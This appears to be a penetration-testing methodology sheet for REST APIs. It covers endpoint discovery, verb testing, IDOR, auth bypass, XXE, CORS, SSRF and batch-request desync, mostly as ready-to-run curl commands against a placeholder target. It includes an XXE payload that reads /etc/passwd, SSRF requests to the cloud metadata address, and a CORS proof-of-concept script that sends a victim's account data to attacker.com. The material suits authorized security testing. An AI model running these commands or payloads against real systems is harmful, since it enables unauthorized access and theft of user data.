# REST API Security Testing

## 1. API Discovery

Common spec locations to probe:
```
/swagger.json  /swagger.yaml  /openapi.json  /openapi.yaml
/api-docs  /v1/api-docs  /v2/api-docs  /v3/api-docs
/swagger-ui.html  /api/swagger  /docs  /redoc
```

Extract every endpoint from a spec once found:
```python
import json
spec = json.load(open('swagger.json'))
for path, methods in spec['paths'].items():
    for method in methods:
        print(method.upper(), path)
```

## 2. HTTP Method Testing

Every endpoint should be tested with every verb, not just the one the UI uses:
```bash
for METHOD in GET POST PUT PATCH DELETE OPTIONS HEAD TRACE; do
  CODE=$(curl -sk -X $METHOD https://target.com/api/users/1 \
    -H "Authorization: Bearer TOKEN" -o /dev/null -w "%{http_code}")
  echo "$METHOD /api/users/1 -> $CODE"
done
```
`405` = method exists but blocked. `200/201` = method works, now check *authorization* on it
(this is API5/BFLA territory - a method the UI never exposes can still be live server-side).
`403` = auth required, might work with a different/higher-privileged token.

## 3. API Versioning - Downgrade

Older versions frequently lack newer security controls:
```bash
# If current is /api/v3/users/me, also test:
curl https://target.com/api/v1/admin/users -H "Authorization: Bearer USER_TOKEN"
curl https://target.com/api/v2/admin/users -H "Authorization: Bearer USER_TOKEN"

# Mobile-specific API hosts are often older/less hardened:
curl https://mobile-api.target.com/v1/users
```

## 4. Mass Assignment (OWASP API3)

Add fields the documented schema doesn't list, but the underlying object plausibly has:
```bash
curl -X PUT https://target.com/api/user/me \
  -H "Authorization: Bearer TOKEN" -H "Content-Type: application/json" \
  -d '{"name":"John","role":"admin","is_verified":true,"subscription":"enterprise","credits":99999}'

curl -X POST https://target.com/api/register \
  -H "Content-Type: application/json" \
  -d '{"email":"user@test.com","password":"Pass1!","role":"admin","isAdmin":true}'
```

## 5. BOLA / IDOR (OWASP API1)

```bash
# Enumerate resource IDs
for id in 1 2 3 4 5 100 1337; do
  CODE=$(curl -sk "https://target.com/api/invoices/$id" \
    -H "Authorization: Bearer VICTIM_TOKEN" -o /dev/null -w "%{http_code}")
  echo "/api/invoices/$id -> $CODE"
done

# Cross-user access - your token, someone else's resource
curl "https://target.com/api/users/OTHER_USER_ID/documents" -H "Authorization: Bearer YOUR_TOKEN"
```
A response code alone doesn't confirm the bug - always read the body and confirm it's actually
the other user's data, not a generic/empty success shape.

## 6. Authorization Header Bypass

```bash
curl https://target.com/api/admin/users                                    # no auth at all
curl -u admin:password https://target.com/api/admin/users                  # Basic auth fallback
curl https://target.com/api/admin/users?api_key=TEST                       # key in query string
curl -H "X-API-Key: TEST" https://target.com/api/admin/users
curl -H "Authorization: Bearer FORGED_ALG_NONE_TOKEN" https://target.com/api/me
curl -H "Authorization: Bearer OLD_OR_EXPIRED_TOKEN" https://target.com/api/me
```

## 7. Content-Type / Format Injection

```bash
# App expects JSON - try XML instead (XXE surface):
curl -X POST https://target.com/api/user -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>'

# form-urlencoded instead of JSON (different parser path, sometimes bypasses WAF rules):
curl -X POST https://target.com/api/login -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=admin&password=pass"

# Type confusion on a scalar field:
# Normal: {"user_id":"1234"}
# Array:  {"user_id":["1234","1"]}      (parser/comparison may evaluate every element)
# Object: {"user_id":{"id":"1234"}}
```

## 8. Parameter Pollution

```bash
curl "https://target.com/api/users?role=user&role=admin"
curl -X POST https://target.com/api/users -d "role=user&role=admin"
curl -X POST https://target.com/api/users -H "Content-Type: application/json" \
  -d '{"user_id":"1234","user_id":"1"}'   # some parsers take the last key, some the first
```

## 9. Rate Limiting (OWASP API4)

Detect it from response headers:
```
X-RateLimit-Limit: 100
X-RateLimit-Remaining: 99
X-RateLimit-Reset: 1700000000
Retry-After: 60
```
Then see `rate-limit-bypass.md` for the full bypass framework before concluding a limiter is
solid - most "rate limited" endpoints only throttle one specific axis (usually per-IP or
per-session request count), not the thing that actually matters (logical attempts against the
account).

## 10. CORS Misconfiguration

```bash
curl -H "Origin: https://attacker.com" -H "Authorization: Bearer TOKEN" -I https://target.com/api/me
```
Vulnerable response shapes:
- `Access-Control-Allow-Origin: https://attacker.com` (reflected)
- `Access-Control-Allow-Origin: *` combined with credentialed requests (shouldn't be possible
  per spec, but misconfigured proxies/frameworks sometimes allow it anyway - test it)
- `Access-Control-Allow-Credentials: true` alongside a reflected origin = account takeover via
  a credentialed cross-origin fetch
- `Access-Control-Allow-Origin: null` reflected = sandboxed-iframe bypass

PoC:
```html
<script>
fetch('https://target.com/api/me', {credentials: 'include'})
  .then(r => r.json())
  .then(data => new Image().src = 'https://attacker.com/steal?d=' + btoa(JSON.stringify(data)));
</script>
```

## 11. API Key Enumeration

```bash
ffuf -u "https://target.com/api/data" -H "X-API-Key: FUZZ" \
  -w /path/to/wordlist.txt -mc 200
```
Also check JS bundles and any accessible source/config for hardcoded keys.

## 12. SSRF via API (OWASP API7)

Any parameter that makes the server fetch a URL you control:
```
POST /api/integrations/slack  {"webhook_url":"http://169.254.169.254/latest/meta-data/"}
POST /api/validate-url        {"url":"http://127.0.0.1:9200/"}
GET  /api/proxy?url=http://internal-service/
```
See `reference/ssrf.md` for the full bypass taxonomy (blocklist/allowlist bypasses, cloud
metadata endpoints, DNS rebinding, gopher-to-RCE chains).

## 13. Batch/Bulk Endpoint Parallel-Array Desync (Auth Bypass)

Any endpoint that lets a client send N logical sub-requests in one HTTP call (REST batch,
GraphQL aliased mutations, JSON-RPC batch, bulk-update verbs) typically implements it as
multiple sequential passes - validate schema, check permission, resolve a handler, execute -
each building its own array/map indexed by item position. **If two of these structures get
populated under different conditions** (one appends a placeholder for a failed item, another
silently skips it), their indices stop meaning the same thing, and code that reads both by the
same index `i` reads mismatched pairs without knowing it.

**Concrete failure shape:** a batch handler builds parallel arrays - parsed sub-requests,
resolved route/handler matches, and permission-check results. On a parse failure, the error
branch appends to the permission-results array but skips the handler-matches array (a one-line
omission). From that point on, `matches[i]` in the dispatch loop is actually a *later* item's
resolved handler, while `validation[i]` is still correctly aligned - a low-privilege item's
permission check passes, but the code dispatches using a different, higher-privilege item's
handler.

**Detection (no source access needed):** send a batch with item 0 deliberately malformed
(unparseable path/method/body) and items 1..k at varying privilege levels or targeting different
routes. Diff response **content** (not just status code) across many orderings - if item k's
data appears in item j's response slot, the desync primitive exists.

**Critical distinction:** content misdirection alone is not automatically an auth bypass. The
escalation requires permission-checking and handler-dispatch to read from genuinely separate,
independently-desyncable structures. If an implementation uses one combined lookup for both
"is this allowed" and "what do I execute," the same trick can misdirect content between routes
without defeating auth - confirm which case you're in before rating severity.

**Preconditions:** the batch endpoint must accept heterogeneous sub-requests (mixed
routes/methods in one call) and process a per-item error via a code path distinct from the
success path, tracking per-item state independently rather than failing the whole batch closed
on the first bad item.

## Checklist

- [ ] API specification found and all endpoints extracted
- [ ] All HTTP methods tested per endpoint
- [ ] API version downgrade tested (v1, v2, mobile, beta)
- [ ] Mass assignment tested on create/update endpoints
- [ ] BOLA/IDOR tested on all resource endpoints, confirmed via response body not just status code
- [ ] Auth header removed, replaced, or forged
- [ ] Content-Type switching (JSON->XML, JSON->form-encoded)
- [ ] Parameter pollution (duplicate params)
- [ ] Rate limit detected and bypass attempted (see `rate-limit-bypass.md`)
- [ ] CORS: reflected Origin, null origin, credentialed reflection
- [ ] API keys checked in JS files and response headers
- [ ] Batch/bulk endpoint desync tested if one exists
